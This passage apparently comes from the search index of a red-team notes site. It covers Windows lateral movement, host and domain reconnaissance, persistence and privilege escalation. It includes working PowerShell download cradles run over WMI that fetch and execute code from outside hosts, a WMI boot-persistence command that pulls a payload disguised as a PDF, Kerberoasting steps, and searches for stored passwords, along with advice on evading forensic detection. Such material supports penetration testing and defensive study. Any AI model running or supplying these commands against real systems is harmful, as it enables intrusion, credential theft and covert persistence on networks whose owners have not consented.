Invoke-WmiMethod -ComputerName 43 .*.*.* -Class Win32_Process -Name Create -ArgumentList \"powershell.exe -w 1 -C `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://43.*.*.*:10080/updates/updater'))-Join''))) `\" \" Reverse portforward staged payload internal -> a download cradle -> with PS creds $credential = New-Object System . Management . Automation . PSCredential ( \"DA\\some\" ,( \"TestPassword\" | ConvertTo-SecureString -AsPlainText -Force )); $cmd = \"powershell.exe -w 1 -C `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://test.com/download/test'))-Join''))) `\" \" ; Invoke-WmiMethod -ComputerName '43.160.34.168' -Credential $credential Win32_Process -Name 'Create' -ArgumentList $cmd","title":"WMI Internal Reverse Port Forward"},{"location":"windows/lat_movement/#unconstrained-delegation-to-attack-da-or-user-credentials","text":"Powershell and PowerView list of servers that allow for unconstrained delegation to attack DA or user credentials: powerpick Get-DomainComputer -Unconstrained > Then e-mail DA with a 1x1px image to a UNC path . > TGS Service ticket is delivered to compromised server and stored in LSASS > Can extract and use TGT until it expires . > Can be used to get krbtgt","title":"Unconstrained delegation to attack DA or user credentials"},{"location":"windows/local_sa_cmds/","text":"Windows Local Situational Awareness Commands \u00b6 Find all token / user data: \u00b6 whoami /all C:\\Users\\KILLSWITCH-GUI>whoami /all USER INFORMATION ---------------- User Name SID ============================== ============================================== desktop-<SNIP> \\killswitch-gui <SNIP> GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ================================================================================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Group used for deny only BUILTIN\\Administrators Alias S-1-5-32-544 Group used for deny only BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group <SNIP> PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled Get Local ipconfig data: \u00b6 ipconfig /all C:\\Users\\KILLSWITCH-GUI>ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : DESKTOP-<SNIP> Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : <SNIP>-router.home Ethernet adapter Ethernet 2: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : PANGP Virtual Ethernet Adapter Physical Address. . . . . . . . . : 02-50-41-00-00-01 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::344b:2314:f01d:a51%8(Preferred) IPv4 Address. . . . . . . . . . . : 10.0.0.235(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.255 Default Gateway . . . . . . . . . : 0.0.0.0 DHCPv6 IAID . . . . . . . . . . . : 419582017 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-20-E4-0D-90-30-9C-23-04-69-34 DNS Servers . . . . . . . . . . . : ::1 127.0.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled <SNIP> List all virtual / physical drives with Powershell: \u00b6 gdr -PSProvider 'FileSystem PS C:\\Users\\KILLSWITCH-GUI> gdr -PSProvider 'FileSystem' Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- B 0.00 0.25 FileSystem B:\\ C 138.56 325.85 FileSystem C:\\ Users\\KILLSWITCH-GUI D 4503.95 3872.36 FileSystem D:\\ <SNIP> [System.IO.DriveInfo]::GetDrives() | Format-Table Name DriveType DriveFormat IsReady AvailableFreeSpace TotalFreeSpace TotalSize RootDirectory VolumeLabel ---- --------- ----------- ------- ------------------ -------------- --------- ------------- ----------- A:\\ Network False A:\\ C:\\ Fixed NTFS True 771920580608 771920580608 988877418496 C:\\ Windows D:\\ Fixed NTFS True 689684144128 689684144128 1990045179904 D:\\ Big Drive E:\\ CDRom False E:\\ G:\\ Network NTFS True 69120000 69120000 104853504 G:\\ GratefulDead Check if host is alive via cmd: \u00b6 ping -n 1 host.com - overt nbtstat -A host.com - Covert: uses NetBios TCP/IP to check if interface is up List the password policy for the domain: \u00b6 net accounts C:\\Users\\KILLSWITCH-GUI>net accounts Force user logoff how long after time expires?: Never Minimum password age (days): 0 Maximum password age (days): 42 Minimum password length: 0 Length of password history maintained: None Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: WORKSTATION Get the current DC your talking to: \u00b6 cmd /c echo %LOGONSERVER% powershell echo $ENV:LOGONSERVER Resolve host-name to IP addr IPv4 with out ping via Powershell: \u00b6 [System.Net.DNS]::GetHostAddresses(\"NAME-PC\") PS C:\\Users\\KILLSWITCH-GUI> [System.Net.DNS]::GetHostAddresses(\"google.com\") Address : 2382879148 AddressFamily : InterNetwork ScopeId : IsIPv6Multicast : False IsIPv6LinkLocal : False IsIPv6SiteLocal : False IsIPv6Teredo : False IsIPv4MappedToIPv6 : False IPAddressToString : 172.217.7.142 Resolve ip to host-name: \u00b6 [System.Net.Dns]::GetHostbyAddress(\"8.8.8.8\") PS C:\\Users\\KILLSWITCH-GUI> [System.Net.Dns]::GetHostbyAddress(\"8.8.8.8\") HostName Aliases AddressList -------- ------- ----------- google-public-dns-a.google.com {} {8.8.8.8} List last boot time via Powershell: \u00b6 gwmi Win32_OperatingSystem | select __SERVER ,@{ label = 'LastRestart' ; expression ={ $_ . ConvertToDateTime ( $_ . LastBootUpTime }}","title":"Host Situational Awareness"},{"location":"windows/local_sa_cmds/#windows-local-situational-awareness-commands","text":"","title":"Windows Local Situational Awareness Commands"},{"location":"windows/local_sa_cmds/#find-all-token-user-data","text":"whoami /all C:\\Users\\KILLSWITCH-GUI>whoami /all USER INFORMATION ---------------- User Name SID ============================== ============================================== desktop-<SNIP> \\killswitch-gui <SNIP> GROUP INFORMATION ----------------- Group Name Type SID Attributes ============================================================= ================ ================================================================================================ ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Group used for deny only BUILTIN\\Administrators Alias S-1-5-32-544 Group used for deny only BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group <SNIP> PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ==================================== ======== SeShutdownPrivilege Shut down the system Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled","title":"Find all token / user data:"},{"location":"windows/local_sa_cmds/#get-local-ipconfig-data","text":"ipconfig /all C:\\Users\\KILLSWITCH-GUI>ipconfig /all Windows IP Configuration Host Name . . . . . . . . . . . . : DESKTOP-<SNIP> Primary Dns Suffix . . . . . . . : Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No DNS Suffix Search List. . . . . . : <SNIP>-router.home Ethernet adapter Ethernet 2: Connection-specific DNS Suffix . : Description . . . . . . . . . . . : PANGP Virtual Ethernet Adapter Physical Address. . . . . . . . . : 02-50-41-00-00-01 DHCP Enabled. . . . . . . . . . . : No Autoconfiguration Enabled . . . . : Yes Link-local IPv6 Address . . . . . : fe80::344b:2314:f01d:a51%8(Preferred) IPv4 Address. . . . . . . . . . . : 10.0.0.235(Preferred) Subnet Mask . . . . . . . . . . . : 255.255.255.255 Default Gateway . . . . . . . . . : 0.0.0.0 DHCPv6 IAID . . . . . . . . . . . : 419582017 DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-20-E4-0D-90-30-9C-23-04-69-34 DNS Servers . . . . . . . . . . . : ::1 127.0.0.1 NetBIOS over Tcpip. . . . . . . . : Enabled <SNIP>","title":"Get Local ipconfig data:"},{"location":"windows/local_sa_cmds/#list-all-virtual-physical-drives-with-powershell","text":"gdr -PSProvider 'FileSystem PS C:\\Users\\KILLSWITCH-GUI> gdr -PSProvider 'FileSystem' Name Used (GB) Free (GB) Provider Root CurrentLocation ---- --------- --------- -------- ---- --------------- B 0.00 0.25 FileSystem B:\\ C 138.56 325.85 FileSystem C:\\ Users\\KILLSWITCH-GUI D 4503.95 3872.36 FileSystem D:\\ <SNIP> [System.IO.DriveInfo]::GetDrives() | Format-Table Name DriveType DriveFormat IsReady AvailableFreeSpace TotalFreeSpace TotalSize RootDirectory VolumeLabel ---- --------- ----------- ------- ------------------ -------------- --------- ------------- ----------- A:\\ Network False A:\\ C:\\ Fixed NTFS True 771920580608 771920580608 988877418496 C:\\ Windows D:\\ Fixed NTFS True 689684144128 689684144128 1990045179904 D:\\ Big Drive E:\\ CDRom False E:\\ G:\\ Network NTFS True 69120000 69120000 104853504 G:\\ GratefulDead","title":"List all virtual / physical drives with Powershell:"},{"location":"windows/local_sa_cmds/#check-if-host-is-alive-via-cmd","text":"ping -n 1 host.com - overt nbtstat -A host.com - Covert: uses NetBios TCP/IP to check if interface is up","title":"Check if host is alive via cmd:"},{"location":"windows/local_sa_cmds/#list-the-password-policy-for-the-domain","text":"net accounts C:\\Users\\KILLSWITCH-GUI>net accounts Force user logoff how long after time expires?: Never Minimum password age (days): 0 Maximum password age (days): 42 Minimum password length: 0 Length of password history maintained: None Lockout threshold: Never Lockout duration (minutes): 30 Lockout observation window (minutes): 30 Computer role: WORKSTATION","title":"List the password policy for the domain:"},{"location":"windows/local_sa_cmds/#get-the-current-dc-your-talking-to","text":"cmd /c echo %LOGONSERVER% powershell echo $ENV:LOGONSERVER","title":"Get the current DC your talking to:"},{"location":"windows/local_sa_cmds/#resolve-host-name-to-ip-addr-ipv4-with-out-ping-via-powershell","text":"[System.Net.DNS]::GetHostAddresses(\"NAME-PC\") PS C:\\Users\\KILLSWITCH-GUI> [System.Net.DNS]::GetHostAddresses(\"google.com\") Address : 2382879148 AddressFamily : InterNetwork ScopeId : IsIPv6Multicast : False IsIPv6LinkLocal : False IsIPv6SiteLocal : False IsIPv6Teredo : False IsIPv4MappedToIPv6 : False IPAddressToString : 172.217.7.142","title":"Resolve host-name to IP addr IPv4 with out ping via Powershell:"},{"location":"windows/local_sa_cmds/#resolve-ip-to-host-name","text":"[System.Net.Dns]::GetHostbyAddress(\"8.8.8.8\") PS C:\\Users\\KILLSWITCH-GUI> [System.Net.Dns]::GetHostbyAddress(\"8.8.8.8\") HostName Aliases AddressList -------- ------- ----------- google-public-dns-a.google.com {} {8.8.8.8}","title":"Resolve ip to host-name:"},{"location":"windows/local_sa_cmds/#list-last-boot-time-via-powershell","text":"gwmi Win32_OperatingSystem | select __SERVER ,@{ label = 'LastRestart' ; expression ={ $_ . ConvertToDateTime ( $_ . LastBootUpTime }}","title":"List last boot time via Powershell:"},{"location":"windows/network_sa_cmds/","text":"Windows Network Situational Awareness Commands \u00b6 PowerView Situational Awareness \u00b6 PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows \"net *\" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality. It also implements various useful metafunctions, including some custom-written user-hunting functions which will identify where on the network specific users are logged into. It can also check which machines on the domain the current user has local administrator access on. Several functions for the enumeration and abuse of domain trusts also exist. See function descriptions for appropriate usage and available options. For detailed output of underlying functionality, pass the -Verbose or -Debug flags. For functions that enumerate multiple machines, pass the -Verbose flag to get a progress status as each host is enumerated. Most of the \"meta\" functions accept an array of hosts from the pipeline. 1 Note All command can be run via PowerPick to increase your OPSEC. Reducing your forensic artifact impact. Allowing the execution of Powershell functionality without the use of Powershell.exe. Primarily this project uses.NET assemblies/libraries to start execution of the Powershell scripts 2 Get computers in LDAP search base and show the DNS name and OS only \u00b6 Get-DomainComputer -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" - -Properties dnshostname , operatingsystem Computers with OS matching 2008, with a OU of intrest \u00b6 Get-DomainComputer -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" -OperatingSystem * 2008 * Computers in LDAP search base and pipe host names of intrest to Get-NetSession \u00b6 powerpick Get-DomainComputer -SearchBase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" | where-object { $_ . dnshostname -like \"*HOST-NAME*\" } | Get-NetSession Remote Desktop Users for a machine for just medium intg RDP \u00b6 Get-NetLocalGroupMember HOST-NAME -GroupName \"Remote Desktop Users\" Admins for a machine for just medium intg RDP \u00b6 Get-NetLocalGroupMember HOST-NAME Corelate GPOs to domain system \u00b6 Get-NetOU -GPLink \"{45172B9C-749A-479A-A9C7-4F85083CD517}\" | % { Get-DomainComputer -ADSPath $_ . distinguishedname -Properties dnshostname } Find all computers and pipe into local admins of machines \u00b6 Get-DomainComputer -searchbase \"LDAP://OU=Location Location,OU=SOME,DC=am,DC=somthing,DC=com\" -Properties name FindOne | Get-NetLocalGroupMember -Method API -Properties ComputerName , GroupName , MemberName | FT -Wrap Find all computer objects / systems that have a GPO applied \u00b6 Get-DomainOU -GPLink \"{A8E139C2-8A5C-455B-905F-FF509D112E8C}\" | % { Get-DomainComputer -ADSPath $_ . distinguishedname -Properties dnshostname } Find all accounts with admin count set / DC sync \u00b6 Get-DomainUser -admincount -Properties samaccountname Check if user has rights to DC sync with the PDC \u00b6 Get-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? { ( $_ . ActiveDirectoryRights -match 'GenericAll' ) -or ( $_ . ObjectAceType -match 'Replication-Get' ) } Pull all email's from user object of a certain OU and output to file for download \u00b6 get-domainuser -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" -properties cn , mail , userprincipalname , extensionattribute10 , msrtcsip-primaryuseraddress | out-file -encoding ASCII C :\\ Windows \\ Tasks \\ contacts . txt https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview \u21a9 https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick \u21a9","title":"Network Situational Awareness"},{"location":"windows/network_sa_cmds/#windows-network-situational-awareness-commands","text":"","title":"Windows Network Situational Awareness Commands"},{"location":"windows/network_sa_cmds/#powerview-situational-awareness","text":"PowerView is a PowerShell tool to gain network situational awareness on Windows domains. It contains a set of pure-PowerShell replacements for various windows \"net *\" commands, which utilize PowerShell AD hooks and underlying Win32 API functions to perform useful Windows domain functionality. It also implements various useful metafunctions, including some custom-written user-hunting functions which will identify where on the network specific users are logged into. It can also check which machines on the domain the current user has local administrator access on. Several functions for the enumeration and abuse of domain trusts also exist. See function descriptions for appropriate usage and available options. For detailed output of underlying functionality, pass the -Verbose or -Debug flags. For functions that enumerate multiple machines, pass the -Verbose flag to get a progress status as each host is enumerated. Most of the \"meta\" functions accept an array of hosts from the pipeline. 1 Note All command can be run via PowerPick to increase your OPSEC. Reducing your forensic artifact impact. Allowing the execution of Powershell functionality without the use of Powershell.exe. Primarily this project uses.NET assemblies/libraries to start execution of the Powershell scripts 2","title":"PowerView Situational Awareness"},{"location":"windows/network_sa_cmds/#get-computers-in-ldap-search-base-and-show-the-dns-name-and-os-only","text":"Get-DomainComputer -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" - -Properties dnshostname , operatingsystem","title":"Get computers in LDAP search base and show the DNS name and OS only"},{"location":"windows/network_sa_cmds/#computers-with-os-matching-2008-with-a-ou-of-intrest","text":"Get-DomainComputer -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" -OperatingSystem * 2008 *","title":"Computers with OS matching 2008, with a OU of intrest"},{"location":"windows/network_sa_cmds/#computers-in-ldap-search-base-and-pipe-host-names-of-intrest-to-get-netsession","text":"powerpick Get-DomainComputer -SearchBase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" | where-object { $_ . dnshostname -like \"*HOST-NAME*\" } | Get-NetSession","title":"Computers in LDAP search base and pipe host names of intrest to Get-NetSession"},{"location":"windows/network_sa_cmds/#remote-desktop-users-for-a-machine-for-just-medium-intg-rdp","text":"Get-NetLocalGroupMember HOST-NAME -GroupName \"Remote Desktop Users\"","title":"Remote Desktop Users for a machine for just medium intg RDP"},{"location":"windows/network_sa_cmds/#admins-for-a-machine-for-just-medium-intg-rdp","text":"Get-NetLocalGroupMember HOST-NAME","title":"Admins for a machine for just medium intg RDP"},{"location":"windows/network_sa_cmds/#corelate-gpos-to-domain-system","text":"Get-NetOU -GPLink \"{45172B9C-749A-479A-A9C7-4F85083CD517}\" | % { Get-DomainComputer -ADSPath $_ . distinguishedname -Properties dnshostname }","title":"Corelate GPOs to domain system"},{"location":"windows/network_sa_cmds/#find-all-computers-and-pipe-into-local-admins-of-machines","text":"Get-DomainComputer -searchbase \"LDAP://OU=Location Location,OU=SOME,DC=am,DC=somthing,DC=com\" -Properties name FindOne | Get-NetLocalGroupMember -Method API -Properties ComputerName , GroupName , MemberName | FT -Wrap","title":"Find all computers and pipe into local admins of machines"},{"location":"windows/network_sa_cmds/#find-all-computer-objects-systems-that-have-a-gpo-applied","text":"Get-DomainOU -GPLink \"{A8E139C2-8A5C-455B-905F-FF509D112E8C}\" | % { Get-DomainComputer -ADSPath $_ . distinguishedname -Properties dnshostname }","title":"Find all computer objects / systems that have a GPO applied"},{"location":"windows/network_sa_cmds/#find-all-accounts-with-admin-count-set-dc-sync","text":"Get-DomainUser -admincount -Properties samaccountname","title":"Find all accounts with admin count set / DC sync"},{"location":"windows/network_sa_cmds/#check-if-user-has-rights-to-dc-sync-with-the-pdc","text":"Get-ObjectACL \"DC=testlab,DC=local\" -ResolveGUIDs | ? { ( $_ . ActiveDirectoryRights -match 'GenericAll' ) -or ( $_ . ObjectAceType -match 'Replication-Get' ) }","title":"Check if user has rights to DC sync with the PDC"},{"location":"windows/network_sa_cmds/#pull-all-emails-from-user-object-of-a-certain-ou-and-output-to-file-for-download","text":"get-domainuser -searchbase \"LDAP://OU=place,OU=thing,DC=domain,DC=loves,DC=com\" -properties cn , mail , userprincipalname , extensionattribute10 , msrtcsip-primaryuseraddress | out-file -encoding ASCII C :\\ Windows \\ Tasks \\ contacts . txt https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon#powerview \u21a9 https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick \u21a9","title":"Pull all email's from user object of a certain OU and output to file for download"},{"location":"windows/persistence/","text":"Windows Persistence \u00b6 WMI Subscription \u00b6 Install wmi persistence for on-boot \u00b6 Great research can be found on Black Hats site 1 . The script can be found at https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1 or in the Empire agent. Warning This method sometimes returns two callbacks on boot! Install-WmiSubscription -CustomEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\" -Namespace \"root\\cimv2\" -DiskStorageLocation \"C:\\Windows\\tasks\\cat.jpg\" -Command \" `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://www.--SNIP--.com/corp/priv/cloud/adp_update.pdf'))-Join''))) `\" \" -Verbose https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf \u21a9","title":"Persistence"},{"location":"windows/persistence/#windows-persistence","text":"","title":"Windows Persistence"},{"location":"windows/persistence/#wmi-subscription","text":"","title":"WMI Subscription"},{"location":"windows/persistence/#install-wmi-persistence-for-on-boot","text":"Great research can be found on Black Hats site 1 . The script can be found at https://github.com/PowerShellMafia/PowerSploit/blob/master/Persistence/Persistence.psm1 or in the Empire agent. Warning This method sometimes returns two callbacks on boot! Install-WmiSubscription -CustomEvent -Query \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\" -Namespace \"root\\cimv2\" -DiskStorageLocation \"C:\\Windows\\tasks\\cat.jpg\" -Command \" `\" &([ScriptBlock]::Create((([Char[]](New-Object Net.WebClient).DownloadData('http://www.--SNIP--.com/corp/priv/cloud/adp_update.pdf'))-Join''))) `\" \" -Verbose https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf \u21a9","title":"Install wmi persistence for on-boot"},{"location":"windows/priv_esc/","text":"Windows Privilege Escalation Commands \u00b6 Host Privilege Escalation \u00b6 Schduled Tasks Path Alteration \u00b6 Schduled tasks we can alter by path? They run at system context: schtasks /query /fo LIST /v C:\\Users\\KILLSWITCH-GUI>schtasks /query /fo LIST /v Folder: \\ HostName: DESKTOP-<SNIP> TaskName: \\ASC10_PerformanceMonitor Next Run Time: N/A Status: Ready Logon Mode: Interactive only Last Run Time: 11/30/1999 12:00:00 AM Last Result: 267011 Author: KILLSWITCH-GUI Task To Run: C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\Monitor.exe /Task Start In: N/A Comment: N/A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Run As User: KILLSWITCH-GUI Delete Task If Not Rescheduled: Disabled Stop Task If Runs X Hours and X Mins: Disabled Schedule: Scheduling data is not available in this format. Schedule Type: At logon time Start Time: N/A Start Date: N/A End Date: N/A Days: N/A Months: N/A Repeat: Every: N/A Repeat: Until: Time: N/A Repeat: Until: Duration: N/A Repeat: Stop If Still Running: N/A <snip> Evaluating Vulnerable Services \u00b6 We can use the net start command to evaluate services on the system: C:\\Users\\KILLSWITCH-GUI>net start These Windows services are started: Advanced SystemCare Service 10 Application Information Application Management Background Intelligent Transfer Service Background Tasks Infrastructure Service Base Filtering Engine cFosSpeed System Service CNG Key Isolation COM+ Event System Computer Browser Connected Devices Platform Service Connected Devices Platform User Service_7e8e2a Connected User Experiences and Telemetry Contact Data_7e8e2a CoreMessaging <SNIP> Evaluating Vulnerable Drivers \u00b6 Look for vuln drivers loaded, we often don't spend enough time looking at this: DRIVERQUERY /FO table C:\\Users\\KILLSWITCH-GUI>DRIVERQUERY /FO table Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 AM AcpiDev ACPI Devices driver Kernel 12/7/1993 6:22:19 AM acpiex Microsoft ACPIEx Drive Kernel 3/1/2087 8:53:50 AM acpipagr ACPI Processor Aggrega Kernel 1/24/2081 8:36:36 AM AcpiPmi ACPI Power Meter Drive Kernel 11/19/2006 9:20:15 PM acpitime ACPI Wake Alarm Driver Kernel 2/9/1974 7:10:30 AM ADP80XX ADP80XX Kernel 4/9/2015 4:49:48 PM <SNIP> Evaluating KBs/Patches \u00b6 Look for KB / Patches installed or not: wmic qfe get Caption,Description,HotFixID,InstalledOn C:\\Users\\KILLSWITCH-GUI>wmic qfe get Caption,Description,HotFixID,InstalledOn Caption Description HotFixID InstalledOn http://support.microsoft.com/?kbid=4022405 Update KB4022405 6/8/2017 http://support.microsoft.com/?kbid=4022730 Security Update KB4022730 6/8/2017 http://support.microsoft.com/?kbid=4025376 Security Update KB4025376 7/12/2017 http://support.microsoft.com/?kbid=4025342 Security Update KB4025342 7/15/2017 <SNIP> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KB..\" /C:\"KB..\" C:\\Users\\KILLSWITCH-GUI> wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:\"KB..\" /C:\"KB4022405\" http://support.microsoft.com/?kbid=4022405 Update KB4022405 6/8/2017 Locating Unattended configs \u00b6 Look for unattended configs in the following dirs: c:\\sysprep.inf c:\\sysprep\\sysprep.xml %WINDIR%\\Panther\\Unattend\\Unattended.xml %WINDIR%\\Panther\\Unattended.xml Locating AlwaysInstallElevated \u00b6 key set to DWORD 1: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated C:\\Users\\KILLSWITCH-GUI>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated ERROR: The system was unable to find the specified registry key or value. Locating Sensitive Files \u00b6 Search the file system for file names containing certain keywords via cmd: dir /s *pass* == *cred* == *vnc* == *.config* C:\\Users\\KILLSWITCH-GUI>dir /s *pass* == *cred* == *vnc* == *.config* Volume in drive C has no label. Volume Serial Number is DA67-AFD2 Directory of C:\\Users\\KILLSWITCH-GUI\\AppData\\Local 06/28/2017 09:04 AM <DIR> password-app 0 File(s) 0 bytes Locating Sensitive Data In Files \u00b6 Search certain file types for a keyword via cmd: findstr /si password *.xml *.ini *.txt C:\\Users\\KILLSWITCH-GUI>findstr /si password *.xml *.ini *.txt .PyCharmCE2017.1\\config\\options\\ide.general.xml: <entry key=\"ide.ssh.one.time.password\" value=\"true\" /> AppData\\Local\\lxss\\rootfs\\usr\\share\\dbus-1\\interfaces\\org.freedesktop.Accounts.User.xml: <method name=\"SetPasswordMode\"> Locating Passwords Within Thhe Registry \u00b6 reg query HKLM /f password /t REG_SZ /s reg query HKCU /f password /t REG_SZ /s C:\\Users\\KILLSWITCH-GUI>reg query HKLM /f password /t REG_SZ /s HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{0fafd998-c8e8-42a1-86d7-7c10c664a415} (Default) REG_SZ Picture Password Enrollment UX HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a} (Default) REG_SZ PicturePasswordLogonProvider Locating Unquoted Service Paths \u00b6 wmic service get name,startmode,pathname | findstr /i /v \":\\windows\\\" | findstr /v \"\"\" C:\\Users\\KILLSWITCH-GUI>wmic service get name,startmode,pathname | findstr /i /v \":\\windows\\\" | findstr /v \"\"\" Name PathName StartMode AJRouter C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted Manual ALG C:\\WINDOWS\\System32\\alg.exe Manual AppIDSvc C:\\WINDOWS\\system32\\svchost.exe -k LocalServiceNetworkRestricted Domain Privilege Escalation \u00b6 Kerbroasting \u00b6 https://gist.github.com/HarmJ0y/cc1004307157e372fc5bd3f89e553059 Kerbroast a domain and set for crashing is hashcat format: \u00b6 Invoke-Kerberoast -OutputFormat Hashcat | fl ACL rights to set a SPN on user account and crack via SPN kerb ticket: \u00b6 1 . Set-DomainObject -Identity 'user' -set @{ serviceprincipalname = 'blah\\blah' } 2 . Invoke-Kerberoast -Identity 'user' -OutputFormat hashcat | fl == alternative command :== Get-DomainUser -Identity 'user' | Get-DomainSPNTicket 3 . Set-DomainObject -Identity 'user' -Clear serviceprincipalname","title":"Privilege Escalation"},{"location":"windows/priv_esc/#windows-privilege-escalation-commands","text":"","title":"Windows Privilege Escalation Commands"},{"location":"windows/priv_esc/#host-privilege-escalation","text":"","title":"Host Privilege Escalation"},{"location":"windows/priv_esc/#schduled-tasks-path-alteration","text":"Schduled tasks we can alter by path? They run at system context: schtasks /query /fo LIST /v C:\\Users\\KILLSWITCH-GUI>schtasks /query /fo LIST /v Folder: \\ HostName: DESKTOP-<SNIP> TaskName: \\ASC10_PerformanceMonitor Next Run Time: N/A Status: Ready Logon Mode: Interactive only Last Run Time: 11/30/1999 12:00:00 AM Last Result: 267011 Author: KILLSWITCH-GUI Task To Run: C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\Monitor.exe /Task Start In: N/A Comment: N/A Scheduled Task State: Enabled Idle Time: Disabled Power Management: Run As User: KILLSWITCH-GUI Delete Task If Not Rescheduled: Disabled Stop Task If Runs X Hours and X Mins: Disabled Schedule: Scheduling data is not available in this format. Schedule Type: At logon time Start Time: N/A Start Date: N/A End Date: N/A Days: N/A Months: N/A Repeat: Every: N/A Repeat: Until: Time: N/A Repeat: Until: Duration: N/A Repeat: Stop If Still Running: N/A <snip>","title":"Schduled Tasks Path Alteration"},{"location":"windows/priv_esc/#evaluating-vulnerable-services","text":"We can use the net start command to evaluate services on the system: C:\\Users\\KILLSWITCH-GUI>net start These Windows services are started: Advanced SystemCare Service 10 Application Information Application Management Background Intelligent Transfer Service Background Tasks Infrastructure Service Base Filtering Engine cFosSpeed System Service CNG Key Isolation COM+ Event System Computer Browser Connected Devices Platform Service Connected Devices Platform User Service_7e8e2a Connected User Experiences and Telemetry Contact Data_7e8e2a CoreMessaging <SNIP>","title":"Evaluating Vulnerable Services"},{"location":"windows/priv_esc/#evaluating-vulnerable-drivers","text":"Look for vuln drivers loaded, we often don't spend enough time looking at this: DRIVERQUERY /FO table C:\\Users\\KILLSWITCH-GUI>DRIVERQUERY /FO table Module Name Display Name Driver Type Link Date ============ ====================== ============= ====================== 1394ohci 1394 OHCI Compliant Ho Kernel 12/10/2006 4:44:38 PM 3ware 3ware Kernel 5/18/2015 6:28:03 PM ACPI Microsoft ACPI Driver Kernel 12/9/1975 6:17:08 